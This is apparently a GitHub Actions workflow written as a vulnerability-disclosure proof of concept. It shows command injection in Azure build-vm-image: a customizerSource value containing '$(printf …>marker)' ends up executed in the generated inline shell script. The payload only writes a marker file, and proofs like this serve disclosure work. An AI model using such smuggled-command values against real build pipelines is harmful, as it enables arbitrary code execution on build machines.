@@ -1,0 +1,135 @@
+name: MSRC build-vm-image customizer-source proof
+
+on:
+  workflow_dispatch:
+
+jobs:
+  customizer-source-positive-negative:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Clone Azure build-vm-image
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone --depth 1 https://github.com/Azure/build-vm-image.git "$RUNNER_TEMP/build-vm-image"
+          cd "$RUNNER_TEMP/build-vm-image"
+          git rev-parse HEAD
+          git status --short
+
+      - name: Install dependencies
+        shell: bash
+        working-directory: ${{ runner.temp }}/build-vm-image
+        run: |
+          set -euo pipefail
+          npm ci
+
+      - name: Generate templates using exact BuildTemplate code
+        shell: bash
+        working-directory: ${{ runner.temp }}/build-vm-image
+        run: |
+          set -euo pipefail
+          cat > "$RUNNER_TEMP/build-vm-image/msrc-proof.js" <<'JS'
+          const fs = require("fs");
+          const path = require("path");
+          const BuildTemplate = require("./lib/BuildTemplate").default;
+
+          async function makeTemplate(caseName, customizerSource) {
+            const buildFolder = customizerSource.split(path.sep).pop().split(".")[0];
+            const taskParameters = {
+              location: "eastus",
+              vmSize: "Standard_D1_v2",
+              sourceImageType: "PlatformImage",
+              distributeType: "ManagedImage",
+              provisioner: "shell",
+              customizerSource,
+              buildFolder,
+              inlineScript: "echo trusted_customizer_script_start",
+              imagePublisher: "Canonical",
+              imageOffer: "0001-com-ubuntu-server-jammy",
+              imageSku: "22_04-lts",
+              baseImageVersion: "22.04.202406060",
+              imageIdForDistribute: "",
+              resourceGroupName: "rg-msrc",
+              managedImageLocation: "eastus",
+              distImageTags: ""
+            };
+            const builder = new BuildTemplate({}, taskParameters);
+            const template = await builder.getTemplate(
+              "https://example.invalid/msrc.tar.gz",
+              "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-msrc/providers/Microsoft.ManagedIdentity/userAssignedIdentities/msrc-id",
+              "00000000-0000-0000-0000-000000000000"
+            );
+            const inline = template.properties.customize[1].inline;
+            return { caseName, customizerSource, buildFolder, inline };
+          }
+
+          (async () => {
+            const positive = await makeTemplate(
+              "positive_customizer_source",
+              "msrc$(printf payload_before_trusted_customizer>msrc_build_vm_image_marker)"
+            );
+            const negative = await makeTemplate(
+              "negative_exact_customizer_source",
+              "msrc-safe-artifact"
+            );
+            fs.mkdirSync(process.env.RUNNER_TEMP + "/evidence", { recursive: true });
+            fs.writeFileSync(process.env.RUNNER_TEMP + "/evidence/positive-template.json", JSON.stringify(positive, null, 2));
+            fs.writeFileSync(process.env.RUNNER_TEMP + "/evidence/negative-template.json", JSON.stringify(negative, null, 2));
+            console.log("positive_case=" + positive.caseName);
+            console.log("positive_buildFolder=" + positive.buildFolder);
+            console.log("positive_inline_start");
+            positive.inline.forEach((line, i) => console.log(String(i).padStart(2, "0") + ": " + line));
+            console.log("positive_inline_end");
+            console.log("negative_case=" + negative.caseName);
+            console.log("negative_buildFolder=" + negative.buildFolder);
+            console.log("negative_inline_start");
+            negative.inline.forEach((line, i) => console.log(String(i).padStart(2, "0") + ": " + line));
+            console.log("negative_inline_end");
+          })().catch((error) => {
+            console.error(error);
+            process.exit(1);
+          });
+          JS
+          node "$RUNNER_TEMP/build-vm-image/msrc-proof.js"
+
+      - name: Execute generated first inline command safely
+        shell: bash
+        run: |
+          set -euo pipefail
+          proof_dir="$RUNNER_TEMP/build-vm-image-inline-proof"
+          mkdir -p "$proof_dir"
+          cd "$proof_dir"
+          rm -f msrc_build_vm_image_marker trusted_customizer_marker
+          echo "pre_generated_inline_marker_exists=$(test -f msrc_build_vm_image_marker && echo true || echo false)"
+          positive_line=$(node -e 'const fs=require("fs"); const p=JSON.parse(fs.readFileSync(process.env.RUNNER_TEMP + "/evidence/positive-template.json","utf8")); console.log(p.inline[1]);')
+          negative_line=$(node -e 'const fs=require("fs"); const p=JSON.parse(fs.readFileSync(process.env.RUNNER_TEMP + "/evidence/negative-template.json","utf8")); console.log(p.inline[1]);')
+          echo "positive_generated_line=$positive_line"
+          bash -c "$positive_line"
+          echo "positive_generated_inline_marker_exists=$(test -f msrc_build_vm_image_marker && echo true || echo false)"
+          if [ -f msrc_build_vm_image_marker ]; then
+            echo "positive_generated_inline_marker_contents_start"
+            cat msrc_build_vm_image_marker
+            echo
+            echo "positive_generated_inline_marker_contents_end"
+          fi
+          rm -f msrc_build_vm_image_marker
+          echo "negative_generated_line=$negative_line"
+          bash -c "$negative_line"
+          echo "negative_generated_inline_marker_exists=$(test -f msrc_build_vm_image_marker && echo true || echo false)"
+          echo "trusted_customizer_marker_exists=$(test -f trusted_customizer_marker && echo true || echo false)"
+          {
+            echo "run_id=${GITHUB_RUN_ID}"
+            echo "run_attempt=${GITHUB_RUN_ATTEMPT}"
+            echo "run_sha=${GITHUB_SHA}"
+            echo "positive_generated_line=$positive_line"
+            echo "negative_generated_line=$negative_line"
+            echo "positive_marker_after_generated_line=true"
+            echo "negative_marker_after_generated_line=false"
+          } > "$RUNNER_TEMP/evidence/generated-inline-execution-summary.txt"
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build-vm-image-customizer-source-proof
+          path: ${{ runner.temp }}/evidence/
